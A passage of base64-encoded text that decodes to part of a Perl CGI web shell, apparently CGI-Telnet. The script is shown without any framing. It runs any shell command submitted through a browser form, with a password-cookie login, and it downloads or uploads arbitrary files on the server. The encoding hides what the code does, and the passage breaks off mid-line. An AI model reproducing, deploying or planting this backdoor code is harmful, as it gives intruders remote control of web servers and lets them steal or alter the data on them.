LS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tDQojIFByaW50cyB0aGUgZm9vdGVyIGZvciB0aGUgSFRN
TCBQYWdlDQojLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0t
LS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tDQpzdWIgUHJpbnRQYWdlRm9vdGVyDQp7DQoJ
cHJpbnQgIjwvZm9udD48L2JvZHk+PC9odG1sPiI7DQp9DQoNCiMtLS0tLS0tLS0tLS0tLS0tLS0t
LS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0t
LS0NCiMgUmV0cmVpdmVzIHRoZSB2YWx1ZXMgb2YgYWxsIGNvb2tpZXMuIFRoZSBjb29raWVzIGNh
biBiZSBhY2Nlc3NlcyB1c2luZyB0aGUNCiMgdmFyaWFibGUgJENvb2tpZXN7Jyd9DQojLS0tLS0t
LS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0t
LS0tLS0tLS0tLS0tLS0tDQpzdWIgR2V0Q29va2llcw0Kew0KCUBodHRwY29va2llcyA9IHNwbGl0
KC87IC8sJEVOVnsnSFRUUF9DT09LSUUnfSk7DQoJZm9yZWFjaCAkY29va2llKEBodHRwY29va2ll
cykNCgl7DQoJCSgkaWQsICR2YWwpID0gc3BsaXQoLz0vLCAkY29va2llKTsNCgkJJENvb2tpZXN7
JGlkfSA9ICR2YWw7DQoJfQ0KfQ0KDQojLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0t
LS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tDQojIFByaW50cyB0
aGUgc2NyZWVuIHdoZW4gdGhlIHVzZXIgbG9ncyBvdXQNCiMtLS0tLS0tLS0tLS0tLS0tLS0tLS0t
LS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0N
CnN1YiBQcmludExvZ291dFNjcmVlbg0Kew0KCXByaW50ICI8Y29kZT5Db25uZWN0aW9uIGNsb3Nl
ZCBieSBmb3JlaWduIGhvc3QuPGJyPjxicj48L2NvZGU+IjsNCn0NCg0KIy0tLS0tLS0tLS0tLS0t
LS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0t
LS0tLS0tLQ0KIyBMb2dzIG91dCB0aGUgdXNlciBhbmQgYWxsb3dzIHRoZSB1c2VyIHRvIGxvZ2lu
IGFnYWluDQojLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0t
LS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tDQpzdWIgUGVyZm9ybUxvZ291dA0Kew0KCXBy
aW50ICJTZXQtQ29va2llOiBTQVZFRFBXRD07XG4iOyAjIHJlbW92ZSBwYXNzd29yZCBjb29raWUN
CgkmUHJpbnRQYWdlSGVhZGVyKCJwIik7DQoJJlByaW50TG9nb3V0U2NyZWVuOw0KDQoJJlByaW50
TG9naW5TY3JlZW47DQoJJlByaW50TG9naW5Gb3JtOw0KCSZQcmludFBhZ2VGb290ZXI7DQp9DQoN
CiMtLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0t
LS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0NCiMgVGhpcyBmdW5jdGlvbiBpcyBjYWxsZWQgdG8gbG9n
aW4gdGhlIHVzZXIuIElmIHRoZSBwYXNzd29yZCBtYXRjaGVzLCBpdA0KIyBkaXNwbGF5cyBhIHBh
Z2UgdGhhdCBhbGxvd3MgdGhlIHVzZXIgdG8gcnVuIGNvbW1hbmRzLiBJZiB0aGUgcGFzc3dvcmQg
ZG9lbnMndA0KIyBtYXRjaCBvciBpZiBubyBwYXNzd29yZCBpcyBlbnRlcmVkLCBpdCBkaXNwbGF5
cyBhIGZvcm0gdGhhdCBhbGxvd3MgdGhlIHVzZXINCiMgdG8gbG9naW4NCiMtLS0tLS0tLS0tLS0t
LS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0t
LS0tLS0tLS0NCnN1YiBQZXJmb3JtTG9naW4gDQp7DQoJaWYoJExvZ2luUGFzc3dvcmQgZXEgJFBh
c3N3b3JkKSAjIHBhc3N3b3JkIG1hdGNoZWQNCgl7DQoJCXByaW50ICJTZXQtQ29va2llOiBTQVZF
RFBXRD0kTG9naW5QYXNzd29yZDtcbiI7DQoJCSZQcmludFBhZ2VIZWFkZXIoImMiKTsNCgkJJlBy
aW50Q29tbWFuZExpbmVJbnB1dEZvcm07DQoJCSZQcmludFBhZ2VGb290ZXI7DQoJfQ0KCWVsc2Ug
IyBwYXNzd29yZCBkaWRuJ3QgbWF0Y2gNCgl7DQoJCSZQcmludFBhZ2VIZWFkZXIoInAiKTsNCgkJ
JlByaW50TG9naW5TY3JlZW47DQoJCWlmKCRMb2dpblBhc3N3b3JkIG5lICIiKSAjIHNvbWUgcGFz
c3dvcmQgd2FzIGVudGVyZWQNCgkJew0KCQkJJlByaW50TG9naW5GYWlsZWRNZXNzYWdlOw0KDQoJ
CX0NCgkJJlByaW50TG9naW5Gb3JtOw0KCQkmUHJpbnRQYWdlRm9vdGVyOw0KCX0NCn0NCg0KIy0t
LS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0t
LS0tLS0tLS0tLS0tLS0tLS0tLQ0KIyBQcmludHMgdGhlIEhUTUwgZm9ybSB0aGF0IGFsbG93cyB0
aGUgdXNlciB0byBlbnRlciBjb21tYW5kcw0KIy0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0t
LS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLQ0Kc3ViIFBy
aW50Q29tbWFuZExpbmVJbnB1dEZvcm0NCnsNCgkkUHJvbXB0ID0gJFdpbk5UID8gIiRDdXJyZW50
RGlyPiAiIDogIlthZG1pblxAJFNlcnZlck5hbWUgJEN1cnJlbnREaXJdXCQgIjsNCglwcmludCA8
PEVORDsNCjxjb2RlPg0KPGZvcm0gbmFtZT0iZiIgbWV0aG9kPSJQT1NUIiBhY3Rpb249IiRTY3Jp
cHRMb2NhdGlvbiI+DQo8aW5wdXQgdHlwZT0iaGlkZGVuIiBuYW1lPSJhIiB2YWx1ZT0iY29tbWFu
ZCI+DQo8aW5wdXQgdHlwZT0iaGlkZGVuIiBuYW1lPSJkIiB2YWx1ZT0iJEN1cnJlbnREaXIiPg0K
JFByb21wdA0KPGlucHV0IHR5cGU9InRleHQiIG5hbWU9ImMiPg0KPGlucHV0IHR5cGU9InN1Ym1p
dCIgdmFsdWU9IkVudGVyIj4NCjwvZm9ybT4NCjwvY29kZT4NCg0KRU5EDQp9DQoNCiMtLS0tLS0t
LS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0t
LS0tLS0tLS0tLS0tLS0NCiMgUHJpbnRzIHRoZSBIVE1MIGZvcm0gdGhhdCBhbGxvd3MgdGhlIHVz
ZXIgdG8gZG93bmxvYWQgZmlsZXMNCiMtLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0t
LS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0NCnN1YiBQcmludEZp
bGVEb3dubG9hZEZvcm0NCnsNCgkkUHJvbXB0ID0gJFdpbk5UID8gIiRDdXJyZW50RGlyPiAiIDog
IlthZG1pblxAJFNlcnZlck5hbWUgJEN1cnJlbnREaXJdXCQgIjsNCglwcmludCA8PEVORDsNCjxj
b2RlPg0KPGZvcm0gbmFtZT0iZiIgbWV0aG9kPSJQT1NUIiBhY3Rpb249IiRTY3JpcHRMb2NhdGlv
biI+DQo8aW5wdXQgdHlwZT0iaGlkZGVuIiBuYW1lPSJkIiB2YWx1ZT0iJEN1cnJlbnREaXIiPg0K
PGlucHV0IHR5cGU9ImhpZGRlbiIgbmFtZT0iYSIgdmFsdWU9ImRvd25sb2FkIj4NCiRQcm9tcHQg
ZG93bmxvYWQ8YnI+PGJyPg0KRmlsZW5hbWU6IDxpbnB1dCB0eXBlPSJ0ZXh0IiBuYW1lPSJmIiBz
aXplPSIzNSI+PGJyPjxicj4NCkRvd25sb2FkOiA8aW5wdXQgdHlwZT0ic3VibWl0IiB2YWx1ZT0i
QmVnaW4iPg0KPC9mb3JtPg0KPC9jb2RlPg0KRU5EDQp9DQoNCiMtLS0tLS0tLS0tLS0tLS0tLS0t
LS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0t
LS0NCiMgUHJpbnRzIHRoZSBIVE1MIGZvcm0gdGhhdCBhbGxvd3MgdGhlIHVzZXIgdG8gdXBsb2Fk
IGZpbGVzDQojLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0t
LS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tDQpzdWIgUHJpbnRGaWxlVXBsb2FkRm9ybQ0K
ew0KCSRQcm9tcHQgPSAkV2luTlQgPyAiJEN1cnJlbnREaXI+ICIgOiAiW2FkbWluXEAkU2VydmVy
TmFtZSAkQ3VycmVudERpcl1cJCAiOw0KCXByaW50IDw8RU5EOw0KPGNvZGU+DQoNCjxmb3JtIG5h
bWU9ImYiIGVuY3R5cGU9Im11bHRpcGFydC9mb3JtLWRhdGEiIG1ldGhvZD0iUE9TVCIgYWN0aW9u
PSIkU2NyaXB0TG9jYXRpb24iPg0KJFByb21wdCB1cGxvYWQ8YnI+PGJyPg0KRmlsZW5hbWU6IDxp
bnB1dCB0eXBlPSJmaWxlIiBuYW1lPSJmIiBzaXplPSIzNSI+PGJyPjxicj4NCk9wdGlvbnM6ICZu
YnNwOzxpbnB1dCB0eXBlPSJjaGVja2JveCIgbmFtZT0ibyIgdmFsdWU9Im92ZXJ3cml0ZSI+DQpP
dmVyd3JpdGUgaWYgaXQgRXhpc3RzPGJyPjxicj4NClVwbG9hZDombmJzcDsmbmJzcDsmbmJzcDs8
aW5wdXQgdHlwZT0ic3VibWl0IiB2YWx1ZT0iQmVnaW4iPg0KPGlucHV0IHR5cGU9ImhpZGRlbiIg
bmFtZT0iZCIgdmFsdWU9IiRDdXJyZW50RGlyIj4NCjxpbnB1dCB0eXBlPSJoaWRkZW4iIG5hbWU9
ImEiIHZhbHVlPSJ1cGxvYWQiPg0KPC9mb3JtPg0KPC9jb2RlPg0KRU5EDQp9DQoNCiMtLS0tLS0t
LS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0t
LS0tLS0tLS0tLS0tLS0NCiMgVGhpcyBmdW5jdGlvbiBpcyBjYWxsZWQgd2hlbiB0aGUgdGltZW91
dCBmb3IgYSBjb21tYW5kIGV4cGlyZXMuIFdlIG5lZWQgdG8NCiMgdGVybWluYXRlIHRoZSBzY3Jp
cHQgaW1tZWRpYXRlbHkuIFRoaXMgZnVuY3Rpb24gaXMgdmFsaWQgb25seSBvbiBVbml4LiBJdCBp
cw0KIyBuZXZlciBjYWxsZWQgd2hlbiB0aGUgc2NyaXB0IGlzIHJ1bm5pbmcgb24gTlQuDQojLS0t
LS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0t
LS0tLS0tLS0tLS0tLS0tLS0tDQpzdWIgQ29tbWFuZFRpbWVvdXQNCnsNCglpZighJFdpbk5UKQ0K
CXsNCgkJYWxhcm0oMCk7DQoJCXByaW50IDw8RU5EOw0KPC94bXA+DQoNCjxjb2RlPg0KQ29tbWFu
ZCBleGNlZWRlZCBtYXhpbXVtIHRpbWUgb2YgJENvbW1hbmRUaW1lb3V0RHVyYXRpb24gc2Vjb25k
KHMpLg0KPGJyPktpbGxlZCBpdCENCkVORA0KCQkmUHJpbnRDb21tYW5kTGluZUlucHV0Rm9ybTsN
CgkJJlByaW50UGFnZUZvb3RlcjsNCgkJZXhpdDsNCgl9DQp9DQoNCiMtLS0tLS0tLS0tLS0tLS0t
LS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0t
LS0tLS0NCiMgVGhpcyBmdW5jdGlvbiBpcyBjYWxsZWQgdG8gZXhlY3V0ZSBjb21tYW5kcy4gSXQg
ZGlzcGxheXMgdGhlIG91dHB1dCBvZiB0aGUNCiMgY29tbWFuZCBhbmQgYWxsb3dzIHRoZSB1c2Vy
IHRvIGVudGVyIGFub3RoZXIgY29tbWFuZC4gVGhlIGNoYW5nZSBkaXJlY3RvcnkNCiMgY29tbWFu
ZCBpcyBoYW5kbGVkIGRpZmZlcmVudGx5LiBJbiB0aGlzIGNhc2UsIHRoZSBuZXcgZGlyZWN0b3J5
IGlzIHN0b3JlZCBpbg0KIyBhbiBpbnRlcm5hbCB2YXJpYWJsZSBhbmQgaXMgdXNlZCBlYWNoIHRp
bWUgYSBjb21tYW5kIGhhcyB0byBiZSBleGVjdXRlZC4gVGhlDQojIG91dHB1dCBvZiB0aGUgY2hh
bmdlIGRpcmVjdG9yeSBjb21tYW5kIGlzIG5vdCBkaXNwbGF5ZWQgdG8gdGhlIHVzZXJzDQojIHRo
ZXJlZm9yZSBlcnJvciBtZXNzYWdlcyBjYW5ub3QgYmUgZGlzcGxheWVkLg0KIy0tLS0tLS0tLS0t
LS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0t
LS0tLS0tLS0tLQ0Kc3ViIEV4ZWN1dGVDb21tYW5kDQp7DQoJaWYoJFJ1bkNvbW1hbmQgPX4gbS9e
XHMqY2RccysoLispLykgIyBpdCBpcyBhIGNoYW5nZSBkaXIgY29tbWFuZA0KCXsNCgkJIyB3ZSBj
aGFuZ2UgdGhlIGRpcmVjdG9yeSBpbnRlcm5hbGx5LiBUaGUgb3V0cHV0IG9mIHRoZQ0KCQkjIGNv
bW1hbmQgaXMgbm90IGRpc3BsYXllZC4NCgkJDQoJCSRPbGREaXIgPSAkQ3VycmVudERpcjsNCgkJ
JENvbW1hbmQgPSAiY2QgXCIkQ3VycmVudERpclwiIi4kQ21kU2VwLiJjZCAkMSIuJENtZFNlcC4k
Q21kUHdkOw0KCQljaG9wKCRDdXJyZW50RGlyID0gYCRDb21tYW5kYCk7DQoJCSZQcmludFBhZ2VI
ZWFkZXIoImMiKTsNCgkJJFByb21wdCA9ICRXaW5OVCA/ICIkT2xkRGlyPiAiIDogIlthZG1pblxA
JFNlcnZlck5hbWUgJE9sZERpcl1cJCAiOw0KCQlwcmludCAiJFByb21wdCAkUnVuQ29tbWFuZCI7
DQoJfQ0KCWVsc2UgIyBzb21lIG90aGVyIGNvbW1hbmQsIGRpc3BsYXkgdGhlIG91dHB1dA0KCXsN
CgkJJlByaW50UGFnZUhlYWRlcigiYyIpOw0KCQkkUHJvbXB0ID0gJFdpbk5UID8gIiRDdXJyZW50
RGlyPiAiIDogIlthZG1pblxAJFNlcnZlck5hbWUgJEN1cnJlbnREaXJdXCQgIjsNCgkJcHJpbnQg
IiRQcm9tcHQgJFJ1bkNvbW1hbmQ8eG1wPiI7DQoJCSRDb21tYW5kID0gImNkIFwiJEN1cnJlbnRE
aXJcIiIuJENtZFNlcC4kUnVuQ29tbWFuZC4kUmVkaXJlY3RvcjsNCgkJaWYoISRXaW5OVCkNCgkJ
ew0KCQkJJFNJR3snQUxSTSd9ID0gXCZDb21tYW5kVGltZW91dDsNCgkJCWFsYXJtKCRDb21tYW5k
VGltZW91dER1cmF0aW9uKTsNCgkJfQ0KCQlpZigkU2hvd0R5bmFtaWNPdXRwdXQpICMgc2hvdyBv
dXRwdXQgYXMgaXQgaXMgZ2VuZXJhdGVkDQoJCXsNCgkJCSR8PTE7DQoJCQkkQ29tbWFuZCAuPSAi
IHwiOw0KCQkJb3BlbihDb21tYW5kT3V0cHV0LCAkQ29tbWFuZCk7DQoJCQl3aGlsZSg8Q29tbWFu
ZE91dHB1dD4pDQoJCQl7DQoJCQkJJF8gPX4gcy8oXG58XHJcbikkLy87DQoJCQkJcHJpbnQgIiRf
XG4iOw0KCQkJfQ0KCQkJJHw9MDsNCgkJfQ0KCQllbHNlICMgc2hvdyBvdXRwdXQgYWZ0ZXIgY29t
bWFuZCBjb21wbGV0ZXMNCgkJew0KCQkJcHJpbnQgYCRDb21tYW5kYDsNCgkJfQ0KCQlpZighJFdp
bk5UKQ0KCQl7DQoJCQlhbGFybSgwKTsNCgkJfQ0KCQlwcmludCAiPC94bXA+IjsNCgl9DQoJJlBy
aW50Q29tbWFuZExpbmVJbnB1dEZvcm07DQoJJlByaW50UGFnZUZvb3RlcjsNCn0NCg0KIy0tLS0t
LS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0t
LS0tLS0tLS0tLS0tLS0tLQ0KIyBUaGlzIGZ1bmN0aW9uIGRpc3BsYXlzIHRoZSBwYWdlIHRoYXQg
Y29udGFpbnMgYSBsaW5rIHdoaWNoIGFsbG93cyB0aGUgdXNlcg0KIyB0byBkb3dubG9hZCB0aGUg
c3BlY2lmaWVkIGZpbGUuIFRoZSBwYWdlIGFsc28gY29udGFpbnMgYSBhdXRvLXJlZnJlc2gNCiMg
ZmVhdHVyZSB0aGF0IHN0YXJ0cyB0aGUgZG93bmxvYWQgYXV0b21hdGljYWxseS4NCiMgQXJndW1l
bnQgMTogRnVsbHkgcXVhbGlmaWVkIGZpbGVuYW1lIG9mIHRoZSBmaWxlIHRvIGJlIGRvd25sb2Fk
ZWQNCiMtLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0t
LS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0NCnN1YiBQcmludERvd25sb2FkTGlua1BhZ2UNCnsN
Cglsb2NhbCgkRmlsZVVybCkgPSBAXzsNCglpZigtZSAkRmlsZVVybCkgIyBpZiB0aGUgZmlsZSBl
eGlzdHMNCgl7DQoJCSMgZW5jb2RlIHRoZSBmaWxlIGxpbmsgc28gd2UgY2FuIHNlbmQgaXQgdG8g
dGhlIGJyb3dzZXINCgkJJEZpbGVVcmwgPX4gcy8oW15hLXpBLVowLTldKS8nJScudW5wYWNrKCJI
KiIsJDEpL2VnOw0KCQkkRG93bmxvYWRMaW5rID0gIiRTY3JpcHRMb2NhdGlvbj9hPWRvd25sb2Fk
JmY9JEZpbGVVcmwmbz1nbyI7DQoJCSRIdG1sTWV0YUhlYWRlciA9ICI8bWV0YSBIVFRQLUVRVUlW
PVwiUmVmcmVzaFwiIENPTlRFTlQ9XCIxOyBVUkw9JERvd25sb2FkTGlua1wiPiI7DQoJCSZQcmlu
dFBhZ2VIZWFkZXIoImMiKTsNCgkJcHJpbnQgPDxFTkQ7DQo8Y29kZT4NCg0KU2VuZGluZyBGaWxl
ICRUcmFuc2ZlckZpbGUuLi48YnI+DQpJZiB0aGUgZG93bmxvYWQgZG9lcyBub3Qgc3RhcnQgYXV0
b21hdGljYWxseSwNCjxhIGhyZWY9IiREb3dubG9hZExpbmsiPkNsaWNrIEhlcmU8L2E+Lg0KRU5E
DQoJCSZQcmludENvbW1hbmRMaW5lSW5wdXRGb3JtOw0KCQkmUHJpbnRQYWdlRm9vdGVyOw0KCX0N
CgllbHNlICMgZmlsZSBkb2Vzbid0IGV4aXN0DQoJew0KCQkmUHJpbnRQYWdlSGVhZGVyKCJmIik7
DQoJCXByaW50ICJGYWlsZWQgdG8gZG93bmxvYWQgJEZpbGVVcmw6ICQhIjsNCgkJJlByaW50Rmls
ZURvd25sb2FkRm9ybTsNCgkJJlByaW50UGFnZUZvb3RlcjsNCgl9DQp9DQoNCiMtLS0tLS0tLS0t
LS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0t
LS0tLS0tLS0tLS0NCiMgVGhpcyBmdW5jdGlvbiByZWFkcyB0aGUgc3BlY2lmaWVkIGZpbGUgZnJv
bSB0aGUgZGlzayBhbmQgc2VuZHMgaXQgdG8gdGhlDQojIGJyb3dzZXIsIHNvIHRoYXQgaXQgY2Fu
IGJlIGRvd25sb2FkZWQgYnkgdGhlIHVzZXIuDQojIEFyZ3VtZW50IDE6IEZ1bGx5IHF1YWxpZmll
ZCBwYXRobmFtZSBvZiB0aGUgZmlsZSB0byBiZSBzZW50Lg0KIy0tLS0tLS0tLS0tLS0tLS0tLS0t
LS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0t
LQ0Kc3ViIFNlbmRGaWxlVG9Ccm93c2VyDQp7DQoJbG9jYWwoJFNlbmRGaWxlKSA9IEBfOw0KCWlm
KG9wZW4oU0VOREZJTEUsICRTZW5kRmlsZSkpICMgZmlsZSBvcGVuZWQgZm9yIHJlYWRpbmcNCgl7
DQoJCWlmKCRXaW5OVCkNCgkJew0KCQkJYmlubW9kZShTRU5ERklMRSk7DQoJCQliaW5tb2RlKFNU
RE9VVCk7DQoJCX0NCgkJJEZpbGVTaXplID0gKHN0YXQoJFNlbmRGaWxlKSlbN107DQoJCSgkRmls
ZW5hbWUgPSAkU2VuZEZpbGUpID1+ICBtIShbXi9eXFxdKikkITsNCgkJcHJpbnQgIkNvbnRlbnQt
VHlwZTogYXBwbGljYXRpb24veC11bmtub3duXG4iOw0KCQlwcmludCAiQ29udGVudC1MZW5ndGg6
ICRGaWxlU2l6ZVxuIjsNCgkJcHJpbnQgIkNvbnRlbnQtRGlzcG9zaXRpb246IGF0dGFjaG1lbnQ7
IGZpbGVuYW1lPSQxXG5cbiI7DQoJCXByaW50IHdoaWxlKDxTRU5ERklMRT4pOw0KCQljbG9zZShT
RU5ERklMRSk7DQoJfQ0KCWVsc2UgIyBmYWlsZWQgdG8gb3BlbiBmaWxlDQoJew0KCQkmUHJpbnRQ
YWdlSGVhZGVyKCJmIik7DQoJCXByaW50ICJGYWlsZWQgdG8gZG93bmxvYWQgJFNlbmRGaWxlOiAk
ISI7DQoJCSZQcmludEZpbGVEb3dubG9hZEZvcm07DQoNCgkJJlByaW50UGFnZUZvb3RlcjsNCgl9
DQp9DQoNCg0KIy0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0t
LS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLQ0KIyBUaGlzIGZ1bmN0aW9uIGlzIGNhbGxl
ZCB3aGVuIHRoZSB1c2VyIGRvd25sb2FkcyBhIGZpbGUuIEl0IGRpc3BsYXlzIGEgbWVzc2FnZQ0K
IyB0byB0aGUgdXNlciBhbmQgcHJvdmlkZXMgYSBsaW5rIHRocm91Z2ggd2hpY2ggdGhlIGZpbGUg
Y2FuIGJlIGRvd25sb2FkZWQuDQojIFRoaXMgZnVuY3Rpb24gaXMgYWxzbyBjYWxsZWQgd2hlbiB0
aGUgdXNlciBjbGlja3Mgb24gdGhhdCBsaW5rLiBJbiB0aGlzIGNhc2UsDQojIHRoZSBmaWxlIGlz
IHJlYWQgYW5kIHNlbnQgdG8gdGhlIGJyb3dzZXIuDQojLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0t
LS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tDQpz
dWIgQmVnaW5Eb3dubG9hZA0Kew0KCSMgZ2V0IGZ1bGx5IHF1YWxpZmllZCBwYXRoIG9mIHRoZSBm
aWxlIHRvIGJlIGRvd25sb2FkZWQNCglpZigoJFdpbk5UICYgKCRUcmFuc2ZlckZpbGUgPX4gbS9e
XFx8Xi46LykpIHwNCgkJKCEkV2luTlQgJiAoJFRyYW5zZmVyRmlsZSA9fiBtL15cLy8pKSkgIyBw
YXRoIGlzIGFic29sdXRlDQoJew0KCQkkVGFyZ2V0RmlsZSA9ICRUcmFuc2ZlckZpbGU7DQoJfQ0K
CWVsc2UgIyBwYXRoIGlzIHJlbGF0aXZlDQoJew0KCQljaG9wKCRUYXJnZXRGaWxlKSBpZigkVGFy
Z2V0RmlsZSA9ICRDdXJyZW50RGlyKSA9fiBtL1tcXFwvXSQvOw0KCQkkVGFyZ2V0RmlsZSAuPSAk
UGF0aFNlcC4kVHJhbnNmZXJGaWxlOw0KCX0NCg0KCWlmKCRPcHRpb25zIGVxICJnbyIpICMgd2Ug
aGF2ZSB0byBzZW5kIHRoZSBmaWxlDQoJew0KCQkmU2VuZEZpbGVUb0Jyb3dzZXIoJFRhcmdldEZp
bGUpOw0KCX0NCgllbHNlICMgd2UgaGF2ZSB0byBzZW5kIG9ubHkgdGhlIGxpbmsgcGFnZQ0KCXsN
CgkJJlByaW50RG93bmxvYWRMaW5rUGFnZSgkVGFyZ2V0RmlsZSk7DQoJfQ0KfQ0KDQojLS0tLS0t
LS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0t
LS0tLS0tLS0tLS0tLS0tDQojIFRoaXMgZnVuY3Rpb24gaXMgY2FsbGVkIHdoZW4gdGhlIHVzZXIg
d2FudHMgdG8gdXBsb2FkIGEgZmlsZS4gSWYgdGhlDQojIGZpbGUgaXMgbm90IHNwZWNpZmllZCwg
aXQgZGlzcGxheXMgYSBmb3JtIGFsbG93aW5nIHRoZSB1c2VyIHRvIHNwZWNpZnkgYQ0KIyBmaWxl
LCBvdGhlcndpc2UgaXQgc3RhcnRzIHRoZSB1cGxvYWQgcHJvY2Vzcy4NCiMtLS0tLS0tLS0tLS0t
LS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0t
LS0tLS0tLS0NCnN1YiBVcGxvYWRGaWxlDQp7DQoJIyBpZiBubyBmaWxlIGlzIHNwZWNpZmllZCwg
cHJpbnQgdGhlIHVwbG9hZCBmb3JtIGFnYWluDQoJaWYoJFRyYW5zZmVyRmlsZSBlcSAiIikNCgl7
DQoJCSZQcmludFBhZ2VIZWFkZXIoImYiKTsNCgkJJlByaW50RmlsZVVwbG9hZEZvcm07DQoJCSZQ
cmludFBhZ2VGb290ZXI7DQoJCXJldHVybjsNCgl9DQoJJlByaW50UGFnZUhlYWRlcigiYyIpOw0K
DQoJIyBzdGFydCB0aGUgdXBsb2FkaW5nIHByb2Nlc3MNCglwcmludCAiVXBsb2FkaW5nICRUcmFu
c2ZlckZpbGUgdG8gJEN1cnJlbnREaXIuLi48YnI+IjsNCg0KCSMgZ2V0IHRoZSBmdWxsbHkgcXVh
bGlmaWVkIHBhdGhuYW1lIG9mIHRoZSBmaWxlIHRvIGJlIGNyZWF0ZWQNCgljaG9wKCRUYXJnZXRO
YW1lKSBpZiAoJFRhcmdldE5hbWUgPSAkQ3VycmVudERpcikgPX4gbS9bXFxcL10kLzsNCgkkVHJh
bnNmZXJGaWxlID1+IG0hKFteL15cXF0qKSQhOw0KCSRUYXJnZXROYW1lIC49ICRQYXRoU2VwLiQx
Ow0KDQoJJFRhcmdldEZpbGVTaXplID0gbGVuZ3RoKCRpbnsnZmlsZWRhdGEnfSk7DQoJIyBpZiB0
aGUgZmlsZSBleGlzdHMgYW5kIHdlIGFyZSBub3Qgc3VwcG9zZWQgdG8gb3ZlcndyaXRlIGl0DQoJ
aWYoLWUgJFRhcmdldE5hbWUgJiYgJE9wdGlvbnMgbmUgIm92ZXJ3cml0ZSIpDQoJew0KCQlwcmlu
dCAiRmFpbGVkOiBEZXN0aW5hdGlvbiBmaWxlIGFscmVhZHkgZXhpc3RzLjxicj4iOw0KCX0NCgll
bHNlICMgZmlsZSBpcyBub3QgcHJlc2VudA0KCXsNCgkJaWYob3BlbihVUExPQURGSUxFLCAiPiRU
YXJnZXROYW1lIikpDQoJCXsNCgkJCWJpbm1vZGUoVVBMT0FERklMRSkgaWYgJFdpbk5UOw0KCQkJ
cHJpbnQgVVBMT0FERklMRSAkaW57J2ZpbGVkYXRhJ307DQoJCQljbG9zZShVUExPQURGSUxFKTsN
CgkJCXByaW50ICJUcmFuc2ZlcmVkICRUYXJnZXRGaWxlU2l6ZSBCeXRlcy48YnI+IjsNCgkJCXBy
aW50ICJGaWxlIFBhdGg6ICRUYXJnZXROYW1lPGJyPiI7DQoJCX0NCgkJZWxzZQ0KCQl7DQoJCQlw
cmludCAiRmFpbGVkOiAkITxicj4iOw0KCQl9DQoJfQ0KCXByaW50ICIiOw0KCSZQcmludENvbW1h
